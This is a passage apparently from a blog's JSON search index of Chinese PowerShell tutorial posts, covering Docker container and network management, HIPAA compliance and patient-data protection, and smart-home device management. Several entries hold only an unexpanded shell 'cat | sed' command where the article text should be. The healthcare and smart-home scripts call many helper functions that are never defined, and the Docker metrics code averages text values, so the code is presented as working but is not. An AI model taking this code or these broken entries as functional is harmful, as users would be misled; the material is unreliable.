&quot;Created&quot; } 'Start' { $result = docker start $ContainerName $containerConfig.Details.Result = $result $containerConfig.Status = &quot;Started&quot; } 'Stop' { $result = docker stop $ContainerName $containerConfig.Details.Result = $result $containerConfig.Status = &quot;Stopped&quot; } 'Remove' { $result = docker rm -f $ContainerName $containerConfig.Details.Result = $result $containerConfig.Status = &quot;Removed&quot; } 'Restart' { $result = docker restart $ContainerName $containerConfig.Details.Result = $result $containerConfig.Status = &quot;Restarted&quot; } 'Pause' { $result = docker pause $ContainerName $containerConfig.Details.Result = $result $containerConfig.Status = &quot;Paused&quot; } 'Resume' { $result = docker unpause $ContainerName $containerConfig.Details.Result = $result $containerConfig.Status = &quot;Resumed&quot; } } # 记录操作日志 $logEntry = [PSCustomObject]@{ Timestamp = Get-Date Action = &quot;Docker容器操作&quot; Container = $ContainerName Operation = $Action Config = $containerConfig } Write-Host &quot;容器操作完成：$($logEntry | ConvertTo-Json)&quot; return $containerConfig } catch { Write-Error &quot;Docker容器操作失败：$_&quot; return $null }} 容器资源监控接下来，创建一个用于监控Docker容器资源的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071function Get-DockerContainerMetrics { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ContainerName, [Parameter()] [ValidateSet('CPU', 'Memory', 'Network', 'Disk', 'All')] [string[]]$Metrics = @('All'), [Parameter()] [int]$DurationSeconds = 60, [Parameter()] [int]$IntervalSeconds = 5 ) try { $metrics = [PSCustomObject]@{ ContainerName = $ContainerName StartTime = Get-Date EndTime = (Get-Date).AddSeconds($DurationSeconds) DataPoints = @() } $endTime = (Get-Date).AddSeconds($DurationSeconds) while ((Get-Date) -lt $endTime) { $dataPoint = [PSCustomObject]@{ Timestamp = Get-Date } if ($Metrics -contains 'All' -or $Metrics -contains 'CPU') { $cpuStats = docker stats $ContainerName --no-stream --format &quot;{{.CPUPerc}}&quot; $dataPoint.CPUUsage = $cpuStats } if ($Metrics -contains 'All' -or $Metrics -contains 'Memory') { $memoryStats = docker stats $ContainerName --no-stream --format &quot;{{.MemUsage}}&quot; $dataPoint.MemoryUsage = $memoryStats } if ($Metrics -contains 'All' -or $Metrics -contains 'Network') { $networkStats = docker stats $ContainerName --no-stream --format &quot;{{.NetIO}}&quot; $dataPoint.NetworkIO = $networkStats } if ($Metrics -contains 'All' -or $Metrics -contains 'Disk') { $diskStats = docker stats $ContainerName --no-stream --format &quot;{{.BlockIO}}&quot; $dataPoint.DiskIO = $diskStats } $metrics.DataPoints += $dataPoint Start-Sleep -Seconds $IntervalSeconds } # 计算统计数据 $metrics.Statistics = [PSCustomObject]@{ AverageCPUUsage = ($metrics.DataPoints | Measure-Object -Property CPUUsage -Average).Average AverageMemoryUsage = ($metrics.DataPoints | Measure-Object -Property MemoryUsage -Average).Average MaxCPUUsage = ($metrics.DataPoints | Measure-Object -Property CPUUsage -Maximum).Maximum MaxMemoryUsage = ($metrics.DataPoints | Measure-Object -Property MemoryUsage -Maximum).Maximum } return $metrics } catch { Write-Error &quot;获取容器指标失败：$_&quot; return $null }} 容器网络管理最后，创建一个用于管理Docker容器网络的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127function Manage-DockerNetwork { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [ValidateSet('Create', 'Remove', 'Connect', 'Disconnect', 'Inspect')] [string]$Action, [Parameter(Mandatory = $true)] [string]$NetworkName, [Parameter()] [ValidateSet('Bridge', 'Host', 'None', 'Overlay')] [string]$Driver = &quot;Bridge&quot;, [Parameter()] [string]$Subnet, [Parameter()] [string]$Gateway, [Parameter()] [string]$ContainerName, [Parameter()] [hashtable]$IPAMConfig, [Parameter()] [switch]$Internal, [Parameter()] [switch]$Attachable ) try { $networkConfig = [PSCustomObject]@{ Name = $NetworkName Action = $Action Timestamp = Get-Date Status = &quot;Pending&quot; Details = @{} } switch ($Action) { 'Create' { $dockerArgs = @( &quot;network&quot;, &quot;create&quot; &quot;--driver&quot;, $Driver ) if ($Subnet) { $dockerArgs += &quot;--subnet&quot;, $Subnet } if ($Gateway) { $dockerArgs += &quot;--gateway&quot;, $Gateway } if ($IPAMConfig) { $dockerArgs += &quot;--ip-range&quot;, $IPAMConfig.IPRange } if ($Internal) { $dockerArgs += &quot;--internal&quot; } if ($Attachable) { $dockerArgs += &quot;--attachable&quot; } $dockerArgs += $NetworkName $result = docker $dockerArgs $networkConfig.Details.Result = $result $networkConfig.Status = &quot;Created&quot; } 'Remove' { $result = docker network rm $NetworkName $networkConfig.Details.Result = $result $networkConfig.Status = &quot;Removed&quot; } 'Connect' { if (-not $ContainerName) { throw &quot;连接网络时必须指定容器名称&quot; } $result = docker network connect $NetworkName $ContainerName $networkConfig.Details.Result = $result $networkConfig.Status = &quot;Connected&quot; } 'Disconnect' { if (-not $ContainerName) { throw &quot;断开网络时必须指定容器名称&quot; } $result = docker network disconnect $NetworkName $ContainerName $networkConfig.Details.Result = $result $networkConfig.Status = &quot;Disconnected&quot; } 'Inspect' { $result = docker network inspect $NetworkName $networkConfig.Details.Result = $result $networkConfig.Status = &quot;Inspected&quot; } } # 记录操作日志 $logEntry = [PSCustomObject]@{ Timestamp = Get-Date Action = &quot;Docker网络操作&quot; Network = $NetworkName Operation = $Action Config = $networkConfig } Write-Host &quot;网络操作完成：$($logEntry | ConvertTo-Json)&quot; return $networkConfig } catch { Write-Error &quot;Docker网络操作失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理Docker容器的示例： 123456789101112131415161718192021222324252627282930# 创建并启动一个容器$container = Manage-DockerContainer -Action &quot;Create&quot; ` -ContainerName &quot;myapp&quot; ` -Image &quot;nginx:latest&quot; ` -PortMappings @(&quot;8080:80&quot;) ` -EnvironmentVariables @(&quot;ENV=production&quot;) ` -Volumes @(&quot;/host/path:/container/path&quot;) ` -Network &quot;my-network&quot; ` -ResourceLimits @{ &quot;Memory&quot; = &quot;512m&quot; &quot;CpuShares&quot; = &quot;512&quot; } ` -Detached# 监控容器资源使用情况$metrics = Get-DockerContainerMetrics -ContainerName &quot;myapp&quot; ` -Metrics @(&quot;CPU&quot;, &quot;Memory&quot;) ` -DurationSeconds 300 ` -IntervalSeconds 10# 创建自定义网络$network = Manage-DockerNetwork -Action &quot;Create&quot; ` -NetworkName &quot;my-network&quot; ` -Driver &quot;Bridge&quot; ` -Subnet &quot;172.18.0.0/16&quot; ` -Gateway &quot;172.18.0.1&quot; ` -IPAMConfig @{ &quot;IPRange&quot; = &quot;172.18.0.2/24&quot; } ` -Attachable 最佳实践 始终为容器指定资源限制，防止资源耗尽 使用命名卷而不是绑定挂载，提高可移植性 定期清理未使用的容器、镜像和网络 实施容器健康检查机制 使用容器编排工具（如Kubernetes）管理大规模部署 实施日志轮转和监控告警 定期更新容器镜像以修复安全漏洞 使用多阶段构建优化镜像大小","link":"/2024/12/05/powershell-docker-management/"},{"title":"","text":"$(cat _posts/2024-12-04-powershell-hashtable-essentials.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/04/powershell-hashtable-essentials/"},{"title":"","text":"$(cat _posts/2024-12-06-powershell-chatbot-development.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/06/powershell-chatbot-development/"},{"title":"","text":"$(cat _posts/2024-12-09-powershell-type-conversion.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/09/powershell-type-conversion/"},{"title":"","text":"$(cat _posts/2024-12-10-powershell-type-conversion.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/10/powershell-type-conversion/"},{"title":"PowerShell 技能连载 - 医疗行业集成","text":"在医疗行业，PowerShell可以帮助我们更好地管理医疗信息系统和确保数据安全。本文将介绍如何使用PowerShell构建一个医疗行业管理系统，包括HIPAA合规性管理、医疗设备监控和患者数据保护等功能。 HIPAA合规性管理首先，让我们创建一个用于管理HIPAA合规性的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293function Manage-HIPAACompliance { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ComplianceID, [Parameter()] [string[]]$ComplianceTypes, [Parameter()] [ValidateSet(&quot;Audit&quot;, &quot;Enforce&quot;, &quot;Report&quot;)] [string]$OperationMode = &quot;Audit&quot;, [Parameter()] [hashtable]$ComplianceConfig, [Parameter()] [string]$LogPath ) try { $manager = [PSCustomObject]@{ ComplianceID = $ComplianceID StartTime = Get-Date ComplianceStatus = @{} Operations = @{} Issues = @() } # 获取合规性配置 $config = Get-ComplianceConfig -ComplianceID $ComplianceID # 管理合规性 foreach ($type in $ComplianceTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用合规性配置 $typeConfig = Apply-ComplianceConfig ` -Config $config ` -Type $type ` -Mode $OperationMode ` -Settings $ComplianceConfig $status.Config = $typeConfig # 执行合规性操作 $operations = Execute-ComplianceOperations ` -Type $type ` -Config $typeConfig $status.Operations = $operations $manager.Operations[$type] = $operations # 检查合规性问题 $issues = Check-ComplianceIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新合规性状态 if ($issues.Count -gt 0) { $status.Status = &quot;NonCompliant&quot; } else { $status.Status = &quot;Compliant&quot; } $manager.ComplianceStatus[$type] = $status } # 记录合规性日志 if ($LogPath) { $manager | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;HIPAA合规性管理失败：$_&quot; return $null }} 医疗设备监控接下来，创建一个用于监控医疗设备的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Monitor-MedicalDevices { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$MonitorID, [Parameter()] [string[]]$DeviceTypes, [Parameter()] [ValidateSet(&quot;Status&quot;, &quot;Performance&quot;, &quot;Security&quot;)] [string]$MonitorMode = &quot;Status&quot;, [Parameter()] [hashtable]$MonitorConfig, [Parameter()] [string]$ReportPath ) try { $monitor = [PSCustomObject]@{ MonitorID = $MonitorID StartTime = Get-Date DeviceStatus = @{} Metrics = @{} Alerts = @() } # 获取监控配置 $config = Get-MonitorConfig -MonitorID $MonitorID # 监控设备 foreach ($type in $DeviceTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Metrics = @{} Alerts = @() } # 应用监控配置 $typeConfig = Apply-MonitorConfig ` -Config $config ` -Type $type ` -Mode $MonitorMode ` -Settings $MonitorConfig $status.Config = $typeConfig # 收集设备指标 $metrics = Collect-DeviceMetrics ` -Type $type ` -Config $typeConfig $status.Metrics = $metrics $monitor.Metrics[$type] = $metrics # 检查设备告警 $alerts = Check-DeviceAlerts ` -Metrics $metrics ` -Config $typeConfig $status.Alerts = $alerts $monitor.Alerts += $alerts # 更新设备状态 if ($alerts.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Normal&quot; } $monitor.DeviceStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-MonitorReport ` -Monitor $monitor ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新监控器状态 $monitor.EndTime = Get-Date return $monitor } catch { Write-Error &quot;医疗设备监控失败：$_&quot; return $null }} 患者数据保护最后，创建一个用于保护患者数据的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Protect-PatientData { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ProtectionID, [Parameter()] [string[]]$ProtectionTypes, [Parameter()] [ValidateSet(&quot;Encrypt&quot;, &quot;Mask&quot;, &quot;Audit&quot;)] [string]$ProtectionMode = &quot;Encrypt&quot;, [Parameter()] [hashtable]$ProtectionConfig, [Parameter()] [string]$ReportPath ) try { $protector = [PSCustomObject]@{ ProtectionID = $ProtectionID StartTime = Get-Date ProtectionStatus = @{} Operations = @{} Issues = @() } # 获取保护配置 $config = Get-ProtectionConfig -ProtectionID $ProtectionID # 保护数据 foreach ($type in $ProtectionTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用保护配置 $typeConfig = Apply-ProtectionConfig ` -Config $config ` -Type $type ` -Mode $ProtectionMode ` -Settings $ProtectionConfig $status.Config = $typeConfig # 执行保护操作 $operations = Execute-ProtectionOperations ` -Type $type ` -Config $typeConfig $status.Operations = $operations $protector.Operations[$type] = $operations # 检查保护问题 $issues = Check-ProtectionIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $protector.Issues += $issues # 更新保护状态 if ($issues.Count -gt 0) { $status.Status = &quot;Unprotected&quot; } else { $status.Status = &quot;Protected&quot; } $protector.ProtectionStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-ProtectionReport ` -Protector $protector ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新保护器状态 $protector.EndTime = Get-Date return $protector } catch { Write-Error &quot;患者数据保护失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理医疗环境的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205# 管理HIPAA合规性$manager = Manage-HIPAACompliance -ComplianceID &quot;COMPLIANCE001&quot; ` -ComplianceTypes @(&quot;Access&quot;, &quot;Security&quot;, &quot;Privacy&quot;) ` -OperationMode &quot;Audit&quot; ` -ComplianceConfig @{ &quot;Access&quot; = @{ &quot;Controls&quot; = @{ &quot;Authentication&quot; = @{ &quot;Type&quot; = &quot;MultiFactor&quot; &quot;Provider&quot; = &quot;AzureAD&quot; &quot;Enforcement&quot; = &quot;Required&quot; } &quot;Authorization&quot; = @{ &quot;Type&quot; = &quot;RBAC&quot; &quot;Scope&quot; = &quot;LeastPrivilege&quot; &quot;Review&quot; = &quot;Monthly&quot; } } &quot;Audit&quot; = @{ &quot;Enabled&quot; = $true &quot;Retention&quot; = 365 &quot;Alerts&quot; = $true } } &quot;Security&quot; = @{ &quot;Controls&quot; = @{ &quot;Encryption&quot; = @{ &quot;Type&quot; = &quot;AES256&quot; &quot;AtRest&quot; = $true &quot;InTransit&quot; = $true } &quot;Network&quot; = @{ &quot;Segmentation&quot; = $true &quot;Firewall&quot; = &quot;Enabled&quot; &quot;IDS&quot; = &quot;Enabled&quot; } } &quot;Monitoring&quot; = @{ &quot;RealTime&quot; = $true &quot;Logging&quot; = &quot;Comprehensive&quot; &quot;Alerts&quot; = $true } } &quot;Privacy&quot; = @{ &quot;Controls&quot; = @{ &quot;DataMasking&quot; = @{ &quot;Enabled&quot; = $true &quot;Fields&quot; = @(&quot;SSN&quot;, &quot;DOB&quot;, &quot;Address&quot;) } &quot;Consent&quot; = @{ &quot;Required&quot; = $true &quot;Expiration&quot; = &quot;Yearly&quot; &quot;Tracking&quot; = $true } } &quot;Reporting&quot; = @{ &quot;Breaches&quot; = &quot;Immediate&quot; &quot;Access&quot; = &quot;Monthly&quot; &quot;Compliance&quot; = &quot;Quarterly&quot; } } } ` -LogPath &quot;C:\\Logs\\hipaa_compliance.json&quot;# 监控医疗设备$monitor = Monitor-MedicalDevices -MonitorID &quot;MONITOR001&quot; ` -DeviceTypes @(&quot;Imaging&quot;, &quot;Monitoring&quot;, &quot;Lab&quot;) ` -MonitorMode &quot;Status&quot; ` -MonitorConfig @{ &quot;Imaging&quot; = @{ &quot;Devices&quot; = @{ &quot;MRI&quot; = @{ &quot;Metrics&quot; = @(&quot;Uptime&quot;, &quot;Performance&quot;, &quot;Errors&quot;) &quot;Threshold&quot; = 95 &quot;Interval&quot; = 60 } &quot;CT&quot; = @{ &quot;Metrics&quot; = @(&quot;Uptime&quot;, &quot;Performance&quot;, &quot;Errors&quot;) &quot;Threshold&quot; = 95 &quot;Interval&quot; = 60 } } &quot;Alerts&quot; = @{ &quot;Critical&quot; = $true &quot;Warning&quot; = $true &quot;Notification&quot; = &quot;Email&quot; } } &quot;Monitoring&quot; = @{ &quot;Devices&quot; = @{ &quot;VitalSigns&quot; = @{ &quot;Metrics&quot; = @(&quot;Accuracy&quot;, &quot;Connectivity&quot;, &quot;Battery&quot;) &quot;Threshold&quot; = 90 &quot;Interval&quot; = 30 } &quot;ECG&quot; = @{ &quot;Metrics&quot; = @(&quot;Accuracy&quot;, &quot;Connectivity&quot;, &quot;Battery&quot;) &quot;Threshold&quot; = 90 &quot;Interval&quot; = 30 } } &quot;Alerts&quot; = @{ &quot;Critical&quot; = $true &quot;Warning&quot; = $true &quot;Notification&quot; = &quot;SMS&quot; } } &quot;Lab&quot; = @{ &quot;Devices&quot; = @{ &quot;Analyzers&quot; = @{ &quot;Metrics&quot; = @(&quot;Calibration&quot;, &quot;Results&quot;, &quot;Maintenance&quot;) &quot;Threshold&quot; = 95 &quot;Interval&quot; = 120 } &quot;Centrifuges&quot; = @{ &quot;Metrics&quot; = @(&quot;Speed&quot;, &quot;Temperature&quot;, &quot;Time&quot;) &quot;Threshold&quot; = 95 &quot;Interval&quot; = 120 } } &quot;Alerts&quot; = @{ &quot;Critical&quot; = $true &quot;Warning&quot; = $true &quot;Notification&quot; = &quot;Email&quot; } } } ` -ReportPath &quot;C:\\Reports\\device_monitoring.json&quot;# 保护患者数据$protector = Protect-PatientData -ProtectionID &quot;PROTECTION001&quot; ` -ProtectionTypes @(&quot;Personal&quot;, &quot;Clinical&quot;, &quot;Financial&quot;) ` -ProtectionMode &quot;Encrypt&quot; ` -ProtectionConfig @{ &quot;Personal&quot; = @{ &quot;Fields&quot; = @{ &quot;Name&quot; = @{ &quot;Type&quot; = &quot;Mask&quot; &quot;Pattern&quot; = &quot;FirstInitialLastName&quot; } &quot;SSN&quot; = @{ &quot;Type&quot; = &quot;Encrypt&quot; &quot;Algorithm&quot; = &quot;AES256&quot; &quot;KeyRotation&quot; = &quot;Monthly&quot; } &quot;Address&quot; = @{ &quot;Type&quot; = &quot;Mask&quot; &quot;Pattern&quot; = &quot;StreetNumberCity&quot; } } &quot;Access&quot; = @{ &quot;Audit&quot; = $true &quot;Logging&quot; = &quot;Detailed&quot; &quot;Alerts&quot; = $true } } &quot;Clinical&quot; = @{ &quot;Fields&quot; = @{ &quot;Diagnosis&quot; = @{ &quot;Type&quot; = &quot;Encrypt&quot; &quot;Algorithm&quot; = &quot;AES256&quot; &quot;KeyRotation&quot; = &quot;Monthly&quot; } &quot;Treatment&quot; = @{ &quot;Type&quot; = &quot;Encrypt&quot; &quot;Algorithm&quot; = &quot;AES256&quot; &quot;KeyRotation&quot; = &quot;Monthly&quot; } &quot;Medications&quot; = @{ &quot;Type&quot; = &quot;Encrypt&quot; &quot;Algorithm&quot; = &quot;AES256&quot; &quot;KeyRotation&quot; = &quot;Monthly&quot; } } &quot;Access&quot; = @{ &quot;Audit&quot; = $true &quot;Logging&quot; = &quot;Detailed&quot; &quot;Alerts&quot; = $true } } &quot;Financial&quot; = @{ &quot;Fields&quot; = @{ &quot;Insurance&quot; = @{ &quot;Type&quot; = &quot;Encrypt&quot; &quot;Algorithm&quot; = &quot;AES256&quot; &quot;KeyRotation&quot; = &quot;Monthly&quot; } &quot;Billing&quot; = @{ &quot;Type&quot; = &quot;Encrypt&quot; &quot;Algorithm&quot; = &quot;AES256&quot; &quot;KeyRotation&quot; = &quot;Monthly&quot; } &quot;Payment&quot; = @{ &quot;Type&quot; = &quot;Mask&quot; &quot;Pattern&quot; = &quot;LastFour&quot; } } &quot;Access&quot; = @{ &quot;Audit&quot; = $true &quot;Logging&quot; = &quot;Detailed&quot; &quot;Alerts&quot; = $true } } } ` -ReportPath &quot;C:\\Reports\\data_protection.json&quot; 最佳实践 实施HIPAA合规性 监控医疗设备 保护患者数据 保持详细的审计记录 定期进行安全评估 实施访问控制 建立应急响应机制 保持系统文档更新","link":"/2024/12/11/powershell-healthcare-integration/"},{"title":"","text":"$(cat _posts/2024-12-12-powershell-pdf-handling.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/12/powershell-pdf-handling/"},{"title":"","text":"$(cat _posts/2024-12-13-powershell-game-server.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/13/powershell-game-server/"},{"title":"","text":"$(cat _posts/2024-12-16-powershell-process-service-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/16/powershell-process-service-management/"},{"title":"","text":"$(cat _posts/2024-12-17-powershell-cross-platform.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/17/powershell-cross-platform/"},{"title":"PowerShell 技能连载 - 智能家居设备管理","text":"在智能家居领域，设备管理对于确保家居系统的正常运行和用户体验至关重要。本文将介绍如何使用PowerShell构建一个智能家居设备管理系统，包括设备监控、场景管理、能源管理等功能。 设备监控首先，让我们创建一个用于监控智能家居设备的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111function Monitor-SmartHomeDevices { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$HomeID, [Parameter()] [string[]]$DeviceTypes, [Parameter()] [string[]]$MonitorMetrics, [Parameter()] [hashtable]$Thresholds, [Parameter()] [string]$ReportPath, [Parameter()] [switch]$AutoAlert ) try { $monitor = [PSCustomObject]@{ HomeID = $HomeID StartTime = Get-Date DeviceStatus = @{} Metrics = @{} Alerts = @() } # 获取家居信息 $home = Get-HomeInfo -HomeID $HomeID # 监控设备 foreach ($type in $DeviceTypes) { $monitor.DeviceStatus[$type] = @{} $monitor.Metrics[$type] = @{} foreach ($device in $home.Devices[$type]) { $status = [PSCustomObject]@{ DeviceID = $device.ID Status = &quot;Unknown&quot; Metrics = @{} Health = 0 Alerts = @() } # 获取设备指标 $deviceMetrics = Get-DeviceMetrics ` -Device $device ` -Metrics $MonitorMetrics $status.Metrics = $deviceMetrics # 评估设备健康状态 $health = Calculate-DeviceHealth ` -Metrics $deviceMetrics ` -Thresholds $Thresholds $status.Health = $health # 检查设备告警 $alerts = Check-DeviceAlerts ` -Metrics $deviceMetrics ` -Health $health if ($alerts.Count -gt 0) { $status.Status = &quot;Warning&quot; $status.Alerts = $alerts $monitor.Alerts += $alerts # 自动告警 if ($AutoAlert) { Send-DeviceAlerts ` -Device $device ` -Alerts $alerts } } else { $status.Status = &quot;Normal&quot; } $monitor.DeviceStatus[$type][$device.ID] = $status $monitor.Metrics[$type][$device.ID] = [PSCustomObject]@{ Metrics = $deviceMetrics Health = $health Alerts = $alerts } } } # 生成报告 if ($ReportPath) { $report = Generate-DeviceReport ` -Monitor $monitor ` -Home $home $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新监控器状态 $monitor.EndTime = Get-Date return $monitor } catch { Write-Error &quot;设备监控失败：$_&quot; return $null }} 场景管理接下来，创建一个用于管理智能家居场景的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293function Manage-SmartHomeScenes { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$SceneID, [Parameter()] [string[]]$SceneTypes, [Parameter()] [ValidateSet(&quot;Manual&quot;, &quot;Scheduled&quot;, &quot;Triggered&quot;)] [string]$ExecutionMode = &quot;Manual&quot;, [Parameter()] [hashtable]$SceneConfig, [Parameter()] [string]$LogPath ) try { $manager = [PSCustomObject]@{ SceneID = $SceneID StartTime = Get-Date SceneStatus = @{} Executions = @() Results = @() } # 获取场景配置 $config = Get-SceneConfig -SceneID $SceneID # 管理场景 foreach ($type in $SceneTypes) { $scene = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Executions = @() Results = @() } # 应用场景配置 $typeConfig = Apply-SceneConfig ` -Config $config ` -Type $type ` -Mode $ExecutionMode ` -Settings $SceneConfig $scene.Config = $typeConfig # 执行场景 $executions = Execute-SceneActions ` -Type $type ` -Config $typeConfig $scene.Executions = $executions $manager.Executions += $executions # 验证执行结果 $results = Validate-SceneExecution ` -Executions $executions ` -Config $typeConfig $scene.Results = $results $manager.Results += $results # 更新场景状态 if ($results.Success) { $scene.Status = &quot;Completed&quot; } else { $scene.Status = &quot;Failed&quot; } $manager.SceneStatus[$type] = $scene } # 记录场景管理日志 if ($LogPath) { $manager | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;场景管理失败：$_&quot; return $null }} 能源管理最后，创建一个用于管理智能家居能源的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798function Manage-SmartHomeEnergy { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$EnergyID, [Parameter()] [string[]]$EnergyTypes, [Parameter()] [ValidateSet(&quot;RealTime&quot;, &quot;Daily&quot;, &quot;Monthly&quot;)] [string]$AnalysisMode = &quot;RealTime&quot;, [Parameter()] [hashtable]$EnergyConfig, [Parameter()] [string]$ReportPath ) try { $manager = [PSCustomObject]@{ EnergyID = $EnergyID StartTime = Get-Date EnergyStatus = @{} Consumption = @{} Optimization = @{} } # 获取能源信息 $energy = Get-EnergyInfo -EnergyID $EnergyID # 管理能源 foreach ($type in $EnergyTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Consumption = @{} Optimization = @{} } # 应用能源配置 $typeConfig = Apply-EnergyConfig ` -Energy $energy ` -Type $type ` -Mode $AnalysisMode ` -Config $EnergyConfig $status.Config = $typeConfig # 分析能源消耗 $consumption = Analyze-EnergyConsumption ` -Energy $energy ` -Type $type ` -Config $typeConfig $status.Consumption = $consumption $manager.Consumption[$type] = $consumption # 优化能源使用 $optimization = Optimize-EnergyUsage ` -Consumption $consumption ` -Config $typeConfig $status.Optimization = $optimization $manager.Optimization[$type] = $optimization # 更新能源状态 if ($optimization.Success) { $status.Status = &quot;Optimized&quot; } else { $status.Status = &quot;Warning&quot; } $manager.EnergyStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-EnergyReport ` -Manager $manager ` -Energy $energy $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;能源管理失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理智能家居设备的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# 监控智能家居设备$monitor = Monitor-SmartHomeDevices -HomeID &quot;HOME001&quot; ` -DeviceTypes @(&quot;Light&quot;, &quot;Thermostat&quot;, &quot;Security&quot;) ` -MonitorMetrics @(&quot;Power&quot;, &quot;Temperature&quot;, &quot;Status&quot;) ` -Thresholds @{ &quot;Power&quot; = @{ &quot;MaxConsumption&quot; = 1000 &quot;DailyLimit&quot; = 5000 &quot;MonthlyLimit&quot; = 50000 } &quot;Temperature&quot; = @{ &quot;MinTemp&quot; = 18 &quot;MaxTemp&quot; = 26 